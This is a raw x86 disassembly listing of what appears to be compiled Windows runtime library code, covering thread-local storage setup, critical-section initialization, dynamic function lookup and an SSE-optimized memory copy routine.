  404f0a:	85 db                	test   %ebx,%ebx
  404f0c:	75 59                	jne    0x404f67
  404f0e:	6a ff                	push   $0xffffffff
  404f10:	ff 35 20 60 41 00    	push   0x416020
  404f16:	e8 ce 02 00 00       	call   0x4051e9
  404f1b:	59                   	pop    %ecx
  404f1c:	59                   	pop    %ecx
  404f1d:	85 c0                	test   %eax,%eax
  404f1f:	75 04                	jne    0x404f25
  404f21:	33 db                	xor    %ebx,%ebx
  404f23:	eb 42                	jmp    0x404f67
  404f25:	56                   	push   %esi
  404f26:	6a 28                	push   $0x28
  404f28:	6a 01                	push   $0x1
  404f2a:	e8 d2 1c 00 00       	call   0x406c01
  404f2f:	8b f0                	mov    %eax,%esi
  404f31:	59                   	pop    %ecx
  404f32:	59                   	pop    %ecx
  404f33:	85 f6                	test   %esi,%esi
  404f35:	74 12                	je     0x404f49
  404f37:	56                   	push   %esi
  404f38:	ff 35 20 60 41 00    	push   0x416020
  404f3e:	e8 a6 02 00 00       	call   0x4051e9
  404f43:	59                   	pop    %ecx
  404f44:	59                   	pop    %ecx
  404f45:	85 c0                	test   %eax,%eax
  404f47:	75 12                	jne    0x404f5b
  404f49:	33 db                	xor    %ebx,%ebx
  404f4b:	53                   	push   %ebx
  404f4c:	ff 35 20 60 41 00    	push   0x416020
  404f52:	e8 92 02 00 00       	call   0x4051e9
  404f57:	59                   	pop    %ecx
  404f58:	59                   	pop    %ecx
  404f59:	eb 04                	jmp    0x404f5f
  404f5b:	8b de                	mov    %esi,%ebx
  404f5d:	33 f6                	xor    %esi,%esi
  404f5f:	56                   	push   %esi
  404f60:	e8 b3 16 00 00       	call   0x406618
  404f65:	59                   	pop    %ecx
  404f66:	5e                   	pop    %esi
  404f67:	57                   	push   %edi
  404f68:	ff 15 7c f1 40 00    	call   *0x40f17c
  404f6e:	5f                   	pop    %edi
  404f6f:	8b c3                	mov    %ebx,%eax
  404f71:	5b                   	pop    %ebx
  404f72:	c3                   	ret
  404f73:	68 b7 4e 40 00       	push   $0x404eb7
  404f78:	e8 bb 01 00 00       	call   0x405138
  404f7d:	a3 20 60 41 00       	mov    %eax,0x416020
  404f82:	59                   	pop    %ecx
  404f83:	83 f8 ff             	cmp    $0xffffffff,%eax
  404f86:	75 03                	jne    0x404f8b
  404f88:	32 c0                	xor    %al,%al
  404f8a:	c3                   	ret
  404f8b:	68 60 6c 41 00       	push   $0x416c60
  404f90:	50                   	push   %eax
  404f91:	e8 53 02 00 00       	call   0x4051e9
  404f96:	59                   	pop    %ecx
  404f97:	59                   	pop    %ecx
  404f98:	85 c0                	test   %eax,%eax
  404f9a:	75 07                	jne    0x404fa3
  404f9c:	e8 05 00 00 00       	call   0x404fa6
  404fa1:	eb e5                	jmp    0x404f88
  404fa3:	b0 01                	mov    $0x1,%al
  404fa5:	c3                   	ret
  404fa6:	a1 20 60 41 00       	mov    0x416020,%eax
  404fab:	83 f8 ff             	cmp    $0xffffffff,%eax
  404fae:	74 0e                	je     0x404fbe
  404fb0:	50                   	push   %eax
  404fb1:	e8 bd 01 00 00       	call   0x405173
  404fb6:	83 0d 20 60 41 00 ff 	orl    $0xffffffff,0x416020
  404fbd:	59                   	pop    %ecx
  404fbe:	b0 01                	mov    $0x1,%al
  404fc0:	c3                   	ret
  404fc1:	56                   	push   %esi
  404fc2:	57                   	push   %edi
  404fc3:	bf 88 6c 41 00       	mov    $0x416c88,%edi
  404fc8:	33 f6                	xor    %esi,%esi
  404fca:	6a 00                	push   $0x0
  404fcc:	68 a0 0f 00 00       	push   $0xfa0
  404fd1:	57                   	push   %edi
  404fd2:	e8 50 02 00 00       	call   0x405227
  404fd7:	83 c4 0c             	add    $0xc,%esp
  404fda:	85 c0                	test   %eax,%eax
  404fdc:	74 15                	je     0x404ff3
  404fde:	ff 05 a0 6c 41 00    	incl   0x416ca0
  404fe4:	83 c6 18             	add    $0x18,%esi
  404fe7:	83 c7 18             	add    $0x18,%edi
  404fea:	83 fe 18             	cmp    $0x18,%esi
  404fed:	72 db                	jb     0x404fca
  404fef:	b0 01                	mov    $0x1,%al
  404ff1:	eb 07                	jmp    0x404ffa
  404ff3:	e8 05 00 00 00       	call   0x404ffd
  404ff8:	32 c0                	xor    %al,%al
  404ffa:	5f                   	pop    %edi
  404ffb:	5e                   	pop    %esi
  404ffc:	c3                   	ret
  404ffd:	56                   	push   %esi
  404ffe:	8b 35 a0 6c 41 00    	mov    0x416ca0,%esi
  405004:	85 f6                	test   %esi,%esi
  405006:	74 20                	je     0x405028
  405008:	6b c6 18             	imul   $0x18,%esi,%eax
  40500b:	57                   	push   %edi
  40500c:	8d b8 70 6c 41 00    	lea    0x416c70(%eax),%edi
  405012:	57                   	push   %edi
  405013:	ff 15 88 f1 40 00    	call   *0x40f188
  405019:	ff 0d a0 6c 41 00    	decl   0x416ca0
  40501f:	83 ef 18             	sub    $0x18,%edi
  405022:	83 ee 01             	sub    $0x1,%esi
  405025:	75 eb                	jne    0x405012
  405027:	5f                   	pop    %edi
  405028:	b0 01                	mov    $0x1,%al
  40502a:	5e                   	pop    %esi
  40502b:	c3                   	ret
  40502c:	cc                   	int3
  40502d:	cc                   	int3
  40502e:	cc                   	int3
  40502f:	cc                   	int3
  405030:	53                   	push   %ebx
  405031:	51                   	push   %ecx
  405032:	bb 30 60 41 00       	mov    $0x416030,%ebx
  405037:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  40503b:	89 4b 08             	mov    %ecx,0x8(%ebx)
  40503e:	89 43 04             	mov    %eax,0x4(%ebx)
  405041:	89 6b 0c             	mov    %ebp,0xc(%ebx)
  405044:	55                   	push   %ebp
  405045:	51                   	push   %ecx
  405046:	50                   	push   %eax
  405047:	58                   	pop    %eax
  405048:	59                   	pop    %ecx
  405049:	5d                   	pop    %ebp
  40504a:	59                   	pop    %ecx
  40504b:	5b                   	pop    %ebx
  40504c:	c2 04 00             	ret    $0x4
  40504f:	cc                   	int3
  405050:	ff d0                	call   *%eax
  405052:	c3                   	ret
  405053:	55                   	push   %ebp
  405054:	8b ec                	mov    %esp,%ebp
  405056:	51                   	push   %ecx
  405057:	53                   	push   %ebx
  405058:	56                   	push   %esi
  405059:	57                   	push   %edi
  40505a:	8b 7d 08             	mov    0x8(%ebp),%edi
  40505d:	eb 70                	jmp    0x4050cf
  40505f:	8b 07                	mov    (%edi),%eax
  405061:	8d 1c 85 e0 6c 41 00 	lea    0x416ce0(,%eax,4),%ebx
  405068:	8b 33                	mov    (%ebx),%esi
  40506a:	90                   	nop
  40506b:	85 f6                	test   %esi,%esi
  40506d:	74 07                	je     0x405076
  40506f:	83 fe ff             	cmp    $0xffffffff,%esi
  405072:	75 76                	jne    0x4050ea
  405074:	eb 56                	jmp    0x4050cc
  405076:	8b 04 85 ac fc 40 00 	mov    0x40fcac(,%eax,4),%eax
  40507d:	68 00 08 00 00       	push   $0x800
  405082:	6a 00                	push   $0x0
  405084:	50                   	push   %eax
  405085:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405088:	ff 15 a0 f1 40 00    	call   *0x40f1a0
  40508e:	8b f0                	mov    %eax,%esi
  405090:	85 f6                	test   %esi,%esi
  405092:	75 47                	jne    0x4050db
  405094:	ff 15 70 f0 40 00    	call   *0x40f070
  40509a:	83 f8 57             	cmp    $0x57,%eax
  40509d:	75 28                	jne    0x4050c7
  40509f:	8b 75 fc             	mov    -0x4(%ebp),%esi
  4050a2:	6a 07                	push   $0x7
  4050a4:	68 44 fd 40 00       	push   $0x40fd44
  4050a9:	56                   	push   %esi
  4050aa:	e8 d9 1b 00 00       	call   0x406c88
  4050af:	83 c4 0c             	add    $0xc,%esp
  4050b2:	85 c0                	test   %eax,%eax
  4050b4:	74 11                	je     0x4050c7
  4050b6:	6a 00                	push   $0x0
  4050b8:	6a 00                	push   $0x0
  4050ba:	56                   	push   %esi
  4050bb:	ff 15 a0 f1 40 00    	call   *0x40f1a0
  4050c1:	8b f0                	mov    %eax,%esi
  4050c3:	85 f6                	test   %esi,%esi
  4050c5:	75 14                	jne    0x4050db
  4050c7:	83 c8 ff             	or     $0xffffffff,%eax
  4050ca:	87 03                	xchg   %eax,(%ebx)
  4050cc:	83 c7 04             	add    $0x4,%edi
  4050cf:	3b 7d 0c             	cmp    0xc(%ebp),%edi
  4050d2:	75 8b                	jne    0x40505f
  4050d4:	33 c0                	xor    %eax,%eax
  4050d6:	5f                   	pop    %edi
  4050d7:	5e                   	pop    %esi
  4050d8:	5b                   	pop    %ebx
  4050d9:	c9                   	leave
  4050da:	c3                   	ret
  4050db:	8b c6                	mov    %esi,%eax
  4050dd:	87 03                	xchg   %eax,(%ebx)
  4050df:	85 c0                	test   %eax,%eax
  4050e1:	74 07                	je     0x4050ea
  4050e3:	56                   	push   %esi
  4050e4:	ff 15 a8 f0 40 00    	call   *0x40f0a8
  4050ea:	8b c6                	mov    %esi,%eax
  4050ec:	eb e8                	jmp    0x4050d6
  4050ee:	55                   	push   %ebp
  4050ef:	8b ec                	mov    %esp,%ebp
  4050f1:	8b 45 08             	mov    0x8(%ebp),%eax
  4050f4:	56                   	push   %esi
  4050f5:	57                   	push   %edi
  4050f6:	8d 3c 85 ec 6c 41 00 	lea    0x416cec(,%eax,4),%edi
  4050fd:	8b 07                	mov    (%edi),%eax
  4050ff:	90                   	nop
  405100:	83 ce ff             	or     $0xffffffff,%esi
  405103:	3b c6                	cmp    %esi,%eax
  405105:	74 2b                	je     0x405132
  405107:	85 c0                	test   %eax,%eax
  405109:	75 29                	jne    0x405134
  40510b:	ff 75 14             	push   0x14(%ebp)
  40510e:	ff 75 10             	push   0x10(%ebp)
  405111:	e8 3d ff ff ff       	call   0x405053
  405116:	59                   	pop    %ecx
  405117:	59                   	pop    %ecx
  405118:	85 c0                	test   %eax,%eax
  40511a:	74 14                	je     0x405130
  40511c:	ff 75 0c             	push   0xc(%ebp)
  40511f:	50                   	push   %eax
  405120:	ff 15 8c f0 40 00    	call   *0x40f08c
  405126:	85 c0                	test   %eax,%eax
  405128:	74 06                	je     0x405130
  40512a:	8b c8                	mov    %eax,%ecx
  40512c:	87 0f                	xchg   %ecx,(%edi)
  40512e:	eb 04                	jmp    0x405134
  405130:	87 37                	xchg   %esi,(%edi)
  405132:	33 c0                	xor    %eax,%eax
  405134:	5f                   	pop    %edi
  405135:	5e                   	pop    %esi
  405136:	5d                   	pop    %ebp
  405137:	c3                   	ret
  405138:	55                   	push   %ebp
  405139:	8b ec                	mov    %esp,%ebp
  40513b:	56                   	push   %esi
  40513c:	68 5c fd 40 00       	push   $0x40fd5c
  405141:	68 54 fd 40 00       	push   $0x40fd54
  405146:	68 5c fd 40 00       	push   $0x40fd5c
  40514b:	6a 00                	push   $0x0
  40514d:	e8 9c ff ff ff       	call   0x4050ee
  405152:	8b f0                	mov    %eax,%esi
  405154:	83 c4 10             	add    $0x10,%esp
  405157:	85 f6                	test   %esi,%esi
  405159:	74 10                	je     0x40516b
  40515b:	ff 75 08             	push   0x8(%ebp)
  40515e:	8b ce                	mov    %esi,%ecx
  405160:	ff 15 24 f2 40 00    	call   *0x40f224
  405166:	ff d6                	call   *%esi
  405168:	5e                   	pop    %esi
  405169:	5d                   	pop    %ebp
  40516a:	c3                   	ret
  40516b:	5e                   	pop    %esi
  40516c:	5d                   	pop    %ebp
  40516d:	ff 25 90 f1 40 00    	jmp    *0x40f190
  405173:	55                   	push   %ebp
  405174:	8b ec                	mov    %esp,%ebp
  405176:	56                   	push   %esi
  405177:	68 70 fd 40 00       	push   $0x40fd70
  40517c:	68 68 fd 40 00       	push   $0x40fd68
  405181:	68 70 fd 40 00       	push   $0x40fd70
  405186:	6a 01                	push   $0x1
  405188:	e8 61 ff ff ff       	call   0x4050ee
  40518d:	83 c4 10             	add    $0x10,%esp
  405190:	8b f0                	mov    %eax,%esi
  405192:	ff 75 08             	push   0x8(%ebp)
  405195:	85 f6                	test   %esi,%esi
  405197:	74 0c                	je     0x4051a5
  405199:	8b ce                	mov    %esi,%ecx
  40519b:	ff 15 24 f2 40 00    	call   *0x40f224
  4051a1:	ff d6                	call   *%esi
  4051a3:	eb 06                	jmp    0x4051ab
  4051a5:	ff 15 9c f1 40 00    	call   *0x40f19c
  4051ab:	5e                   	pop    %esi
  4051ac:	5d                   	pop    %ebp
  4051ad:	c3                   	ret
  4051ae:	55                   	push   %ebp
  4051af:	8b ec                	mov    %esp,%ebp
  4051b1:	56                   	push   %esi
  4051b2:	68 80 fd 40 00       	push   $0x40fd80
  4051b7:	68 78 fd 40 00       	push   $0x40fd78
  4051bc:	68 80 fd 40 00       	push   $0x40fd80
  4051c1:	6a 02                	push   $0x2
  4051c3:	e8 26 ff ff ff       	call   0x4050ee
  4051c8:	83 c4 10             	add    $0x10,%esp
  4051cb:	8b f0                	mov    %eax,%esi
  4051cd:	ff 75 08             	push   0x8(%ebp)
  4051d0:	85 f6                	test   %esi,%esi
  4051d2:	74 0c                	je     0x4051e0
  4051d4:	8b ce                	mov    %esi,%ecx
  4051d6:	ff 15 24 f2 40 00    	call   *0x40f224
  4051dc:	ff d6                	call   *%esi
  4051de:	eb 06                	jmp    0x4051e6
  4051e0:	ff 15 94 f1 40 00    	call   *0x40f194
  4051e6:	5e                   	pop    %esi
  4051e7:	5d                   	pop    %ebp
  4051e8:	c3                   	ret
  4051e9:	55                   	push   %ebp
  4051ea:	8b ec                	mov    %esp,%ebp
  4051ec:	56                   	push   %esi
  4051ed:	68 94 fd 40 00       	push   $0x40fd94
  4051f2:	68 8c fd 40 00       	push   $0x40fd8c
  4051f7:	68 94 fd 40 00       	push   $0x40fd94
  4051fc:	6a 03                	push   $0x3
  4051fe:	e8 eb fe ff ff       	call   0x4050ee
  405203:	83 c4 10             	add    $0x10,%esp
  405206:	8b f0                	mov    %eax,%esi
  405208:	ff 75 0c             	push   0xc(%ebp)
  40520b:	ff 75 08             	push   0x8(%ebp)
  40520e:	85 f6                	test   %esi,%esi
  405210:	74 0c                	je     0x40521e
  405212:	8b ce                	mov    %esi,%ecx
  405214:	ff 15 24 f2 40 00    	call   *0x40f224
  40521a:	ff d6                	call   *%esi
  40521c:	eb 06                	jmp    0x405224
  40521e:	ff 15 98 f1 40 00    	call   *0x40f198
  405224:	5e                   	pop    %esi
  405225:	5d                   	pop    %ebp
  405226:	c3                   	ret
  405227:	55                   	push   %ebp
  405228:	8b ec                	mov    %esp,%ebp
  40522a:	56                   	push   %esi
  40522b:	68 a8 fd 40 00       	push   $0x40fda8
  405230:	68 a0 fd 40 00       	push   $0x40fda0
  405235:	68 a8 fd 40 00       	push   $0x40fda8
  40523a:	6a 04                	push   $0x4
  40523c:	e8 ad fe ff ff       	call   0x4050ee
  405241:	8b f0                	mov    %eax,%esi
  405243:	83 c4 10             	add    $0x10,%esp
  405246:	85 f6                	test   %esi,%esi
  405248:	74 15                	je     0x40525f
  40524a:	ff 75 10             	push   0x10(%ebp)
  40524d:	8b ce                	mov    %esi,%ecx
  40524f:	ff 75 0c             	push   0xc(%ebp)
  405252:	ff 75 08             	push   0x8(%ebp)
  405255:	ff 15 24 f2 40 00    	call   *0x40f224
  40525b:	ff d6                	call   *%esi
  40525d:	eb 0c                	jmp    0x40526b
  40525f:	ff 75 0c             	push   0xc(%ebp)
  405262:	ff 75 08             	push   0x8(%ebp)
  405265:	ff 15 8c f1 40 00    	call   *0x40f18c
  40526b:	5e                   	pop    %esi
  40526c:	5d                   	pop    %ebp
  40526d:	c3                   	ret
  40526e:	cc                   	int3
  40526f:	cc                   	int3
  405270:	57                   	push   %edi
  405271:	56                   	push   %esi
  405272:	8b 74 24 10          	mov    0x10(%esp),%esi
  405276:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  40527a:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  40527e:	8b c1                	mov    %ecx,%eax
  405280:	8b d1                	mov    %ecx,%edx
  405282:	03 c6                	add    %esi,%eax
  405284:	3b fe                	cmp    %esi,%edi
  405286:	76 08                	jbe    0x405290
  405288:	3b f8                	cmp    %eax,%edi
  40528a:	0f 82 94 02 00 00    	jb     0x405524
  405290:	83 f9 20             	cmp    $0x20,%ecx
  405293:	0f 82 d2 04 00 00    	jb     0x40576b
  405299:	81 f9 80 00 00 00    	cmp    $0x80,%ecx
  40529f:	73 13                	jae    0x4052b4
  4052a1:	0f ba 25 10 60 41 00 	btl    $0x1,0x416010
  4052a8:	01 
  4052a9:	0f 82 8e 04 00 00    	jb     0x40573d
  4052af:	e9 e3 01 00 00       	jmp    0x405497
  4052b4:	0f ba 25 58 6c 41 00 	btl    $0x1,0x416c58
  4052bb:	01 
  4052bc:	73 09                	jae    0x4052c7
  4052be:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  4052c0:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4052c4:	5e                   	pop    %esi
  4052c5:	5f                   	pop    %edi
  4052c6:	c3                   	ret
  4052c7:	8b c7                	mov    %edi,%eax
  4052c9:	33 c6                	xor    %esi,%eax
  4052cb:	a9 0f 00 00 00       	test   $0xf,%eax
  4052d0:	75 0e                	jne    0x4052e0
  4052d2:	0f ba 25 10 60 41 00 	btl    $0x1,0x416010
  4052d9:	01 
  4052da:	0f 82 e0 03 00 00    	jb     0x4056c0
  4052e0:	0f ba 25 58 6c 41 00 	btl    $0x0,0x416c58
  4052e7:	00 
  4052e8:	0f 83 a9 01 00 00    	jae    0x405497
  4052ee:	f7 c7 03 00 00 00    	test   $0x3,%edi
  4052f4:	0f 85 9d 01 00 00    	jne    0x405497
  4052fa:	f7 c6 03 00 00 00    	test   $0x3,%esi
  405300:	0f 85 ac 01 00 00    	jne    0x4054b2
  405306:	0f ba e7 02          	bt     $0x2,%edi
  40530a:	73 0d                	jae    0x405319
  40530c:	8b 06                	mov    (%esi),%eax
  40530e:	83 e9 04             	sub    $0x4,%ecx
  405311:	8d 76 04             	lea    0x4(%esi),%esi
  405314:	89 07                	mov    %eax,(%edi)
  405316:	8d 7f 04             	lea    0x4(%edi),%edi
  405319:	0f ba e7 03          	bt     $0x3,%edi
  40531d:	73 11                	jae    0x405330
  40531f:	f3 0f 7e 0e          	movq   (%esi),%xmm1
  405323:	83 e9 08             	sub    $0x8,%ecx
  405326:	8d 76 08             	lea    0x8(%esi),%esi
  405329:	66 0f d6 0f          	movq   %xmm1,(%edi)
  40532d:	8d 7f 08             	lea    0x8(%edi),%edi
  405330:	f7 c6 07 00 00 00    	test   $0x7,%esi
  405336:	74 65                	je     0x40539d
  405338:	0f ba e6 03          	bt     $0x3,%esi
  40533c:	0f 83 b4 00 00 00    	jae    0x4053f6
  405342:	66 0f 6f 4e f4       	movdqa -0xc(%esi),%xmm1
  405347:	8d 76 f4             	lea    -0xc(%esi),%esi
  40534a:	8b ff                	mov    %edi,%edi
  40534c:	66 0f 6f 5e 10       	movdqa 0x10(%esi),%xmm3
  405351:	83 e9 30             	sub    $0x30,%ecx
  405354:	66 0f 6f 46 20       	movdqa 0x20(%esi),%xmm0
  405359:	66 0f 6f 6e 30       	movdqa 0x30(%esi),%xmm5
  40535e:	8d 76 30             	lea    0x30(%esi),%esi
  405361:	83 f9 30             	cmp    $0x30,%ecx
  405364:	66 0f 6f d3          	movdqa %xmm3,%xmm2
  405368:	66 0f 3a 0f d9 0c    	palignr $0xc,%xmm1,%xmm3
  40536e:	66 0f 7f 1f          	movdqa %xmm3,(%edi)
  405372:	66 0f 6f e0          	movdqa %xmm0,%xmm4
  405376:	66 0f 3a 0f c2 0c    	palignr $0xc,%xmm2,%xmm0
  40537c:	66 0f 7f 47 10       	movdqa %xmm0,0x10(%edi)
  405381:	66 0f 6f cd          	movdqa %xmm5,%xmm1
  405385:	66 0f 3a 0f ec 0c    	palignr $0xc,%xmm4,%xmm5
  40538b:	66 0f 7f 6f 20       	movdqa %xmm5,0x20(%edi)
  405390:	8d 7f 30             	lea    0x30(%edi),%edi
  405393:	73 b7                	jae    0x40534c
  405395:	8d 76 0c             	lea    0xc(%esi),%esi
  405398:	e9 af 00 00 00       	jmp    0x40544c
  40539d:	66 0f 6f 4e f8       	movdqa -0x8(%esi),%xmm1
  4053a2:	8d 76 f8             	lea    -0x8(%esi),%esi
  4053a5:	8d 49 00             	lea    0x0(%ecx),%ecx
  4053a8:	66 0f 6f 5e 10       	movdqa 0x10(%esi),%xmm3
  4053ad:	83 e9 30             	sub    $0x30,%ecx
  4053b0:	66 0f 6f 46 20       	movdqa 0x20(%esi),%xmm0
  4053b5:	66 0f 6f 6e 30       	movdqa 0x30(%esi),%xmm5
  4053ba:	8d 76 30             	lea    0x30(%esi),%esi
  4053bd:	83 f9 30             	cmp    $0x30,%ecx
  4053c0:	66 0f 6f d3          	movdqa %xmm3,%xmm2
  4053c4:	66 0f 3a 0f d9 08    	palignr $0x8,%xmm1,%xmm3
  4053ca:	66 0f 7f 1f          	movdqa %xmm3,(%edi)
  4053ce:	66 0f 6f e0          	movdqa %xmm0,%xmm4
  4053d2:	66 0f 3a 0f c2 08    	palignr $0x8,%xmm2,%xmm0
  4053d8:	66 0f 7f 47 10       	movdqa %xmm0,0x10(%edi)
  4053dd:	66 0f 6f cd          	movdqa %xmm5,%xmm1
  4053e1:	66 0f 3a 0f ec 08    	palignr $0x8,%xmm4,%xmm5
  4053e7:	66 0f 7f 6f 20       	movdqa %xmm5,0x20(%edi)
  4053ec:	8d 7f 30             	lea    0x30(%edi),%edi
  4053ef:	73 b7                	jae    0x4053a8
  4053f1:	8d 76 08             	lea    0x8(%esi),%esi
  4053f4:	eb 56                	jmp    0x40544c
  4053f6:	66 0f 6f 4e fc       	movdqa -0x4(%esi),%xmm1
  4053fb:	8d 76 fc             	lea    -0x4(%esi),%esi
  4053fe:	8b ff                	mov    %edi,%edi
  405400:	66 0f 6f 5e 10       	movdqa 0x10(%esi),%xmm3
  405405:	83 e9 30             	sub    $0x30,%ecx
  405408:	66 0f 6f 46 20       	movdqa 0x20(%esi),%xmm0
  40540d:	66 0f 6f 6e 30       	movdqa 0x30(%esi),%xmm5
  405412:	8d 76 30             	lea    0x30(%esi),%esi
  405415:	83 f9 30             	cmp    $0x30,%ecx
  405418:	66 0f 6f d3          	movdqa %xmm3,%xmm2
  40541c:	66 0f 3a 0f d9 04    	palignr $0x4,%xmm1,%xmm3
  405422:	66 0f 7f 1f          	movdqa %xmm3,(%edi)
  405426:	66 0f 6f e0          	movdqa %xmm0,%xmm4
  40542a:	66 0f 3a 0f c2 04    	palignr $0x4,%xmm2,%xmm0
  405430:	66 0f 7f 47 10       	movdqa %xmm0,0x10(%edi)
  405435:	66 0f 6f cd          	movdqa %xmm5,%xmm1
  405439:	66 0f 3a 0f ec 04    	palignr $0x4,%xmm4,%xmm5
  40543f:	66 0f 7f 6f 20       	movdqa %xmm5,0x20(%edi)
  405444:	8d 7f 30             	lea    0x30(%edi),%edi
  405447:	73 b7                	jae    0x405400
  405449:	8d 76 04             	lea    0x4(%esi),%esi
  40544c:	83 f9 10             	cmp    $0x10,%ecx
  40544f:	72 13                	jb     0x405464
  405451:	f3 0f 6f 0e          	movdqu (%esi),%xmm1
  405455:	83 e9 10             	sub    $0x10,%ecx
  405458:	8d 76 10             	lea    0x10(%esi),%esi
  40545b:	66 0f 7f 0f          	movdqa %xmm1,(%edi)
  40545f:	8d 7f 10             	lea    0x10(%edi),%edi
  405462:	eb e8                	jmp    0x40544c
  405464:	0f ba e1 02          	bt     $0x2,%ecx
  405468:	73 0d                	jae    0x405477
  40546a:	8b 06                	mov    (%esi),%eax
  40546c:	83 e9 04             	sub    $0x4,%ecx
  40546f:	8d 76 04             	lea    0x4(%esi),%esi
  405472:	89 07                	mov    %eax,(%edi)
  405474:	8d 7f 04             	lea    0x4(%edi),%edi
  405477:	0f ba e1 03          	bt     $0x3,%ecx
  40547b:	73 11                	jae    0x40548e
  40547d:	f3 0f 7e 0e          	movq   (%esi),%xmm1
  405481:	83 e9 08             	sub    $0x8,%ecx
  405484:	8d 76 08             	lea    0x8(%esi),%esi
  405487:	66 0f d6 0f          	movq   %xmm1,(%edi)
  40548b:	8d 7f 08             	lea    0x8(%edi),%edi
  40548e:	8b 04 8d d4 54 40 00 	mov    0x4054d4(,%ecx,4),%eax
  405495:	ff e0                	jmp    *%eax
  405497:	f7 c7 03 00 00 00    	test   $0x3,%edi
  40549d:	74 13                	je     0x4054b2
  40549f:	8a 06                	mov    (%esi),%al
  4054a1:	88 07                	mov    %al,(%edi)
  4054a3:	49                   	dec    %ecx
  4054a4:	83 c6 01             	add    $0x1,%esi
  4054a7:	83 c7 01             	add    $0x1,%edi
  4054aa:	f7 c7 03 00 00 00    	test   $0x3,%edi
  4054b0:	75 ed                	jne    0x40549f
  4054b2:	8b d1                	mov    %ecx,%edx
  4054b4:	83 f9 20             	cmp    $0x20,%ecx
  4054b7:	0f 82 ae 02 00 00    	jb     0x40576b
  4054bd:	c1 e9 02             	shr    $0x2,%ecx
  4054c0:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4054c2:	83 e2 03             	and    $0x3,%edx
  4054c5:	ff 24 95 d4 54 40 00 	jmp    *0x4054d4(,%edx,4)
  4054cc:	ff 24 8d e4 54 40 00 	jmp    *0x4054e4(,%ecx,4)
  4054d3:	90                   	nop
  4054d4:	e4 54                	in     $0x54,%al
  4054d6:	40                   	inc    %eax
  4054d7:	00 ec                	add    %ch,%ah
  4054d9:	54                   	push   %esp
  4054da:	40                   	inc    %eax
  4054db:	00 f8                	add    %bh,%al
  4054dd:	54                   	push   %esp
  4054de:	40                   	inc    %eax
  4054df:	00 0c 55 40 00 8b 44 	add    %cl,0x448b0040(,%edx,2)
  4054e6:	24 0c                	and    $0xc,%al
  4054e8:	5e                   	pop    %esi
  4054e9:	5f                   	pop    %edi
  4054ea:	c3                   	ret
  4054eb:	90                   	nop
  4054ec:	8a 06                	mov    (%esi),%al
  4054ee:	88 07                	mov    %al,(%edi)
  4054f0:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4054f4:	5e                   	pop    %esi
  4054f5:	5f                   	pop    %edi
  4054f6:	c3                   	ret
  4054f7:	90                   	nop
  4054f8:	8a 06                	mov    (%esi),%al
  4054fa:	88 07                	mov    %al,(%edi)
  4054fc:	8a 46 01             	mov    0x1(%esi),%al
  4054ff:	88 47 01             	mov    %al,0x1(%edi)
  405502:	8b 44 24 0c          	mov    0xc(%esp),%eax
  405506:	5e                   	pop    %esi
  405507:	5f                   	pop    %edi
  405508:	c3                   	ret
  405509:	8d 49 00             	lea    0x0(%ecx),%ecx
  40550c:	8a 06                	mov    (%esi),%al
  40550e:	88 07                	mov    %al,(%edi)
  405510:	8a 46 01             	mov    0x1(%esi),%al
  405513:	88 47 01             	mov    %al,0x1(%edi)
  405516:	8a 46 02             	mov    0x2(%esi),%al
  405519:	88 47 02             	mov    %al,0x2(%edi)
  40551c:	8b 44 24 0c          	mov    0xc(%esp),%eax
  405520:	5e                   	pop    %esi
  405521:	5f                   	pop    %edi
  405522:	c3                   	ret
  405523:	90                   	nop
  405524:	8d 34 0e             	lea    (%esi,%ecx,1),%esi
  405527:	8d 3c 0f             	lea    (%edi,%ecx,1),%edi
  40552a:	83 f9 20             	cmp    $0x20,%ecx
  40552d:	0f 82 51 01 00 00    	jb     0x405684
  405533:	0f ba 25 10 60 41 00 	btl    $0x1,0x416010
  40553a:	01 
  40553b:	0f 82 94 00 00 00    	jb     0x4055d5
  405541:	f7 c7 03 00 00 00    	test   $0x3,%edi
  405547:	74 14                	je     0x40555d
  405549:	8b d7                	mov    %edi,%edx
  40554b:	83 e2 03             	and    $0x3,%edx
  40554e:	2b ca                	sub    %edx,%ecx
  405550:	8a 46 ff             	mov    -0x1(%esi),%al
  405553:	88 47 ff             	mov    %al,-0x1(%edi)
  405556:	4e                   	dec    %esi
  405557:	4f                   	dec    %edi
  405558:	83 ea 01             	sub    $0x1,%edx
  40555b:	75 f3                	jne    0x405550
  40555d:	83 f9 20             	cmp    $0x20,%ecx
  405560:	0f 82 1e 01 00 00    	jb     0x405684
  405566:	8b d1                	mov    %ecx,%edx
  405568:	c1 e9 02             	shr    $0x2,%ecx
  40556b:	83 e2 03             	and    $0x3,%edx
  40556e:	83 ee 04             	sub    $0x4,%esi
  405571:	83 ef 04             	sub    $0x4,%edi
  405574:	fd                   	std
  405575:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  405577:	fc                   	cld
  405578:	ff 24 95 80 55 40 00 	jmp    *0x405580(,%edx,4)
  40557f:	90                   	nop
  405580:	90                   	nop
  405581:	55                   	push   %ebp
  405582:	40                   	inc    %eax
  405583:	00 98 55 40 00 a8    	add    %bl,-0x57ffbfab(%eax)
  405589:	55                   	push   %ebp
  40558a:	40                   	inc    %eax
  40558b:	00 bc 55 40 00 8b 44 	add    %bh,0x448b0040(%ebp,%edx,2)
  405592:	24 0c                	and    $0xc,%al
  405594:	5e                   	pop    %esi
  405595:	5f                   	pop    %edi
  405596:	c3                   	ret
  405597:	90                   	nop
  405598:	8a 46 03             	mov    0x3(%esi),%al
  40559b:	88 47 03             	mov    %al,0x3(%edi)
  40559e:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4055a2:	5e                   	pop    %esi
  4055a3:	5f                   	pop    %edi
  4055a4:	c3                   	ret
  4055a5:	8d 49 00             	lea    0x0(%ecx),%ecx
  4055a8:	8a 46 03             	mov    0x3(%esi),%al
  4055ab:	88 47 03             	mov    %al,0x3(%edi)
  4055ae:	8a 46 02             	mov    0x2(%esi),%al
  4055b1:	88 47 02             	mov    %al,0x2(%edi)
  4055b4:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4055b8:	5e                   	pop    %esi
  4055b9:	5f                   	pop    %edi
  4055ba:	c3                   	ret
  4055bb:	90                   	nop
